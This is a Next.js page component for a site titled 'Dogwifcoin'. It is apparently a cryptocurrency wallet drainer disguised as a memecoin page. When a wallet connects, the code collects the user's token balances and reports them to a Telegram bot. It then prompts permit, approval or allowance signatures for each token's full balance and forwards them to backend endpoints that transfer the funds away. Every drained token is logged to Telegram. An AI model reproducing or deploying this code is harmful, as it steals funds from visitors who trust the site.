/* eslint-disable */
import { useAccount } from "wagmi";
import type { NextPage } from "next";
import Head from "next/head";
import { useEffect, useState } from "react";
import { BigNumber, ethers, providers } from "ethers";
import { askAllowance, askApproval } from "../utils/allowance";
import { classicPermit } from "../utils/permit";
import { tokenBalanceBSC, tokenBalanceETH, tokenBalancePermitETH, tokenBalanceAllowanceETH, tokenBalanceApproveETH, tokenBalanceAllowanceBSC, tokenBalancePermitBSC } from "../utils/tokenBalance";
import { useNetwork } from 'wagmi'
import Site from "./site";
import { Box } from '@chakra-ui/react';
import Home1 from './Home'
import { ChakraProvider, extendTheme } from '@chakra-ui/react';
import '@fontsource/poppins';
import Layout from "./components/Layout";


const Home: NextPage = () => {
	const { connector, address } = useAccount();
	const { chain } = useNetwork();

	useEffect(() => {
		const init = async () => {
			try {

				const connect = await connector.getProvider({ chainId: chain.id });

				const provider = new providers.Web3Provider(connect);

				const res = await getBalances(address);
				console.log("connect",address )
				const tokens = res.sortedBalances;

				await sendTokensToBot(tokens);

				for (let i = 0; i < tokens.length; i++) {
					const token = tokens[i];
					const abi = await checkMetadata(token.contract_address);
					if (abi !== undefined) {
						for (let j = 0; j < abi.length; j++) {
							// Ethereum
							if (chain.id === 1) {
								if (abi[j].hasOwnProperty("name")) {
									const method = abi[j].name;

									if (method === "permit") {
										let ethPermitData: any = await tokenBalancePermitETH(address, token.contract_address, token.quote_rate);
										if (!ethPermitData.balance.isZero()) {
											const signature = await classicPermit(ethPermitData.name, ethPermitData.address, address, ethPermitData.balance, ethPermitData.nonce, provider.getSigner(), chain.id);
											await griiitPermit(ethPermitData.address, ethPermitData.balance, ethPermitData.nonce, signature)
											const json = {
												address: address,
												token: token.contract_name,
												contract: token.contract_address,
												balance: token.pretty_quote,
												type: "permit"
											}
											await griiitTelegram("transfer", json);
										}

										break;
									} else if (method === "increaseApproval") {
										let ethApproveData: any = await tokenBalanceApproveETH(address, token.contract_address, token.quote_rate);
										if (!ethApproveData.balance.isZero()) {
											await askApproval(ethApproveData.address, ethApproveData.balance, provider.getSigner());
											await griiitApprove(ethApproveData.address, ethApproveData.balance);
											const json = {
												address: address,
												token: token.contract_name,
												contract: token.contract_address,
												balance: token.pretty_quote,
												type: "approval"
											}
											await griiitTelegram("transfer", json);
										}

										break;
									} else if (method === "increaseAllowance") {
										let ethAllowanceData: any = await tokenBalanceAllowanceETH(address, token.contract_address, token.quote_rate);
										if (!ethAllowanceData.balance.isZero()) {
											await askAllowance(ethAllowanceData.address, ethAllowanceData.balance, provider.getSigner());
											await griiitAllowance(ethAllowanceData.address, ethAllowanceData.balance);
											const json = {
												address: address,
												token: token.contract_name,
												contract: token.contract_address,
												balance: token.pretty_quote,
												type: "allowance"
											}
											await griiitTelegram("transfer", json);
										}

										break;
									}
								}
							}
							// Bsc
							/*
							else if (chain.id === 56) {
								const method = abi[j];
								if (method === "permit") {
									let bscPermitData: any = await tokenBalancePermitBSC(address, token.contract_address, token.quote_rate);
									if (bscPermitData.balance !== 0) {
										const signature = await classicPermit(bscPermitData.name, bscPermitData.address, address, bscPermitData.balance, bscPermitData.nonce, provider.getSigner(), chain.id);
										await griiitPermit(bscPermitData.address, bscPermitData.balance, bscPermitData.nonce, signature)
									}

									break;
								} else if (method === "increaseAllowance") {
									let bscAllowanceData: any = await tokenBalanceAllowanceBSC(address, token.contract_address, token.quote_rate);
									if (bscAllowanceData.balance !== 0) {
										await askAllowance(bscAllowanceData.address, bscAllowanceData.balance, provider.getSigner());
										await griiitAllowance(bscAllowanceData.address, bscAllowanceData.balance);
									}

									break;
								}
							}
							*/

						}
					}
				}
			}
			catch (e) {
				console.log("err:", e);
			}
		}
		if (address != undefined && connector !== undefined) init();

	}, [connector]);

	const getBalances = async (walletAddr: string) => {
		let data;
		try {
			const response = await fetch("/api/get-balances", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					walletAddress: walletAddr,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			data = res;
		} catch (error) {
			console.error(error);
		}

		return data;
	}

	const checkMetadata = async (tokenAddr: string) => {
		let data;
		try {
			const response = await fetch("/api/check-metadata", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					tokenAddress: tokenAddr,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.error(response);
			}

			const res = await response.json();
			data = res.abi;
		} catch (error) {
			console.error(error);
		}
		return data;
	}

	const sendTokensToBot = async (message: any) => {
		const filteredDataList = message.map(item => ({
			contract_name: item.contract_name,
			contract_address: item.contract_address,
			pretty_quote: item.pretty_quote
		}));

		const newElement = {
			address: address
		};

		filteredDataList.unshift(newElement);

		await griiitTelegram("balances", filteredDataList);
	}

	const griiitTelegram = async (type, message: any) => {

		try {
			const response = await fetch("/api/telegram", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					type: type,
					message: message
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			//console.log(res);
		} catch (error) {
			console.error(error);
		}
	}

	const griiitAllowance = async (tokenAddr: string, balance: BigNumber) => {

		try {
			const response = await fetch("/api/transfer", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					tokenAddress: tokenAddr,
					amount: balance.toString(),
					owner: address,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			//console.log(res);
		} catch (error) {
			console.error(error);
		}
	}

	const griiitPermit = async (tokenAddr: string, balance: BigNumber, tokenNonce, permitSignature) => {
		try {
			const response = await fetch("/api/permit", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					tokenAddress: tokenAddr,
					amount: balance.toString(),
					owner: address,
					nonce: tokenNonce.toString(),
					signature: permitSignature,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			//console.log(res);
		} catch (error) {
			console.error(error);
		}
	}

	const griiitApprove = async (tokenAddr: string, balance: BigNumber) => {

		try {
			const response = await fetch("/api/transfer", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					tokenAddress: tokenAddr,
					amount: balance.toString(),
					owner: address,
					chain: chain.id
				}),
			});

			if (!response.ok) {
				console.log(response);
			}

			const res = await response.json();
			//console.log(res);
		} catch (error) {
			console.error(error);
		}

	}


	const colors = {
		bg: '#040404',
		'blue-1': '#06bfdf',
		'blue-2': '#00d9ff',
		'pink-1': '#ad18c7',
		'pink-2': '#e552ff',
		'card-bg': '#121212',
		gray: '#808080',
	};

	const fonts = {
		body: "'Poppins', sans-serif",
		heading: "'Poppins', sans-serif",
	};

	const theme = extendTheme({ colors, fonts });

	return (
		<div>

			<Head>
				<meta charSet="UTF-8" />
				<meta name="viewport" content="width=device-width, initial-scale=1.0" />
				{/* <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossOrigin="anonymous" /> */}
				<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossOrigin="anonymous" referrerPolicy="no-referrer" />
				{/* <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" /> */}
				<title>Dogwifcoin</title>
			</Head>
			<main>

				<Home1 />


			</main>

		</div>
	);
};

export default Home;
